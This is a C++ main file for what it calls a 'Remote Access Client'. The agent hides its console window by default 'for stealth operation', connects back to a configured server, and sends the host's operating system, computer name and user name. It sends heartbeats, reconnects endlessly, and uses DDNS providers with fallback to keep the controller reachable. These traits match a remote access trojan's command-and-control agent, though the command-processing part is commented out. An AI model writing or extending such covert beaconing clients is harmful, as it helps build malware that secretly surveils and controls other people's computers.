#include <iostream>
#include <memory>
#include <thread>
#include <chrono>
#include <csignal>
#include <atomic>

#ifdef _WIN32
#include <windows.h>
#include <winsock2.h>
#include <ws2tcpip.h>
#pragma comment(lib, "ws2_32.lib")
#else
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#endif

#include "common/Logger.h"
#include "network/NetworkManager.h"
#include "network/DDNSManager.h"
#include "system/SystemInfo.h"
#include "common/Config.h"
#include "common/Protocol.h"
#include "common/DDNSConfig.h"

// Global variables for graceful shutdown
std::atomic<bool> g_running{true};
std::unique_ptr<Network::NetworkManager> g_networkManager;

// Signal handler for graceful shutdown
void signalHandler(int signal) {
    Logger::LogManager::GetInstance().Info("Received shutdown signal: " + std::to_string(signal));
    g_running = false;
    
    if (g_networkManager) {
        g_networkManager->Stop();
    }
}

// Hide console window on Windows
void hideConsole() {
#ifdef _WIN32
    HWND hwnd = GetConsoleWindow();
    if (hwnd != nullptr) {
        ShowWindow(hwnd, SW_HIDE);
    }
#endif
}

// Initialize Winsock on Windows
bool initializeNetwork() {
#ifdef _WIN32
    WSADATA wsaData;
    int result = WSAStartup(MAKEWORD(2, 2), &wsaData);
    if (result != 0) {
        Logger::LogManager::GetInstance().Error("WSAStartup failed: " + std::to_string(result));
        return false;
    }
#endif
    return true;
}

// Cleanup network resources
void cleanupNetwork() {
#ifdef _WIN32
    WSACleanup();
#endif
}

// Main connection loop
void connectionLoop() {
    Logger::LogManager::GetInstance().Info("Starting connection loop");
    
    while (g_running) {
        try {
            // Create network manager
            g_networkManager = std::make_unique<Network::NetworkManager>();
            
            // Attempt to connect to server
            Logger::LogManager::GetInstance().Info("Attempting to connect to server...");
            
            g_networkManager->SetServerAddress(Config::SERVER_HOST, Config::SERVER_PORT);
            if (g_networkManager->Start()) {
                Logger::LogManager::GetInstance().Info("Connected to server successfully");
                
                // Send initial system information
                System::SystemInfo sysInfo;
                std::map<std::string, std::string> systemData;
                systemData["OS"] = sysInfo.GetOperatingSystem();
                systemData["ComputerName"] = sysInfo.GetComputerName();
                systemData["UserName"] = sysInfo.GetUserName();
                systemData["AgentVersion"] = "1.0.0";
                
                std::string clientId = "client_" + std::to_string(::GetCurrentProcessId());
                std::string systemInfoJson = Protocol::CreateSystemInfoMessage(clientId, systemData);
                g_networkManager->SendMessage(systemInfoJson);
                
                // Give server time to process the system info message
                std::this_thread::sleep_for(std::chrono::milliseconds(500));
                
                // Start command processing
                // CommandProcessor cmdProcessor(g_networkManager.get()); // Commented out as CommandProcessor is not included
                
                // Main communication loop
                while (g_running && g_networkManager->IsConnected()) {
                    // Network manager handles message processing internally
                    
                    // Send heartbeat periodically
                    static auto lastHeartbeat = std::chrono::steady_clock::now();
                    auto now = std::chrono::steady_clock::now();
                    auto elapsed = std::chrono::duration_cast<std::chrono::seconds>(now - lastHeartbeat);
                    
                    if (elapsed.count() >= Config::HEARTBEAT_INTERVAL) {
                        g_networkManager->SendHeartbeat();
                        lastHeartbeat = now;
                    }
                    
                    // Small delay to prevent high CPU usage
                    std::this_thread::sleep_for(std::chrono::milliseconds(100));
                }
                
                Logger::LogManager::GetInstance().Info("Connection lost or terminated");
            } else {
                Logger::LogManager::GetInstance().Error("Failed to connect to server");
            }
            
            // Cleanup current connection
            g_networkManager.reset();
            
        } catch (const std::exception& e) {
            Logger::LogManager::GetInstance().Error("Exception in connection loop: " + std::string(e.what()));
        } catch (...) {
            Logger::LogManager::GetInstance().Error("Unknown exception in connection loop");
        }
        
        // Wait before attempting to reconnect
        if (g_running) {
            Logger::LogManager::GetInstance().Info("Waiting before reconnection attempt...");
            std::this_thread::sleep_for(std::chrono::seconds(Config::RECONNECT_DELAY));
        }
    }
    
    Logger::LogManager::GetInstance().Info("Connection loop terminated");
}

int main(int argc, char* argv[]) {
    try {
        // Initialize logger
        Logger::LogManager::GetInstance().Initialize();
        Logger::LogManager::GetInstance().Info("Remote Access Client starting...");
        
        // Initialize DDNS configuration
        Config::DDNSConfigManager& ddnsConfig = Config::DDNSConfigManager::GetInstance();
        if (!ddnsConfig.LoadConfiguration()) {
            Logger::LogManager::GetInstance().Warning("Failed to load DDNS configuration, using defaults");
        }
        
        // Initialize DDNS manager if enabled
        std::unique_ptr<Network::DDNSManager> ddnsManager;
        if (ddnsConfig.IsEnabled()) {
            ddnsManager = std::make_unique<Network::DDNSManager>();
            
            // Configure DDNS providers
            auto providers = ddnsConfig.GetProviders();
            for (const auto& config : providers) {
                ddnsManager->AddProvider(config);
            }
            
            // Set fallback configuration
            ddnsManager->SetFallbackEnabled(ddnsConfig.IsFallbackEnabled());
            ddnsManager->SetFallbackOrder(ddnsConfig.GetFallbackOrder());
            ddnsManager->SetIPDetectionServices(ddnsConfig.GetIPDetectionServices());
            
            // Start DDNS manager
            if (ddnsManager->Start()) {
                Logger::LogManager::GetInstance().Info("DDNS manager started successfully");
            } else {
                Logger::LogManager::GetInstance().Error("Failed to start DDNS manager");
            }
        }
        
        // Parse command line arguments
        bool hideWindow = true;
        for (int i = 1; i < argc; ++i) {
            std::string arg = argv[i];
            if (arg == "--show-console" || arg == "-s") {
                hideWindow = false;
            } else if (arg == "--help" || arg == "-h") {
                std::cout << "Remote Access Client\n";
                std::cout << "Usage: " << argv[0] << " [options]\n";
                std::cout << "Options:\n";
                std::cout << "  --show-console, -s    Show console window\n";
                std::cout << "  --help, -h           Show this help message\n";
                return 0;
            }
        }
        
        // Hide console window for stealth operation
        if (hideWindow) {
            hideConsole();
        }
        
        // Initialize network subsystem
        if (!initializeNetwork()) {
            Logger::LogManager::GetInstance().Error("Failed to initialize network subsystem");
            return 1;
        }
        
        // Set up signal handlers for graceful shutdown
        std::signal(SIGINT, signalHandler);
        std::signal(SIGTERM, signalHandler);
#ifdef _WIN32
        std::signal(SIGBREAK, signalHandler);
#endif
        
        // Log system information
        System::SystemInfo sysInfo;
        // auto systemData = sysInfo.GetSystemSummary();
        // Logger::LogManager::GetInstance().Info("System Info: " + sysInfo.GetSystemSummary());
        // Logger::LogManager::GetInstance().Info("User Info: " + sysInfo.GetUserName());
        
        // Start main connection loop in a separate thread
        std::thread connectionThread(connectionLoop);
        
        // Wait for shutdown signal
        while (g_running) {
            std::this_thread::sleep_for(std::chrono::milliseconds(500));
        }
        
        // Wait for connection thread to finish
        if (connectionThread.joinable()) {
            connectionThread.join();
        }
        
        // Stop DDNS manager if running
        if (ddnsManager && ddnsManager->IsRunning()) {
            ddnsManager->Stop();
            Logger::LogManager::GetInstance().Info("DDNS manager stopped");
        }
        
        // Cleanup
        cleanupNetwork();
        Logger::LogManager::GetInstance().Info("Remote Access Client terminated");
        
    } catch (const std::exception& e) {
        Logger::LogManager::GetInstance().Error("Fatal exception: " + std::string(e.what()));
        return 1;
    } catch (...) {
        Logger::LogManager::GetInstance().Error("Unknown fatal exception");
        return 1;
    }
    
    return 0;
}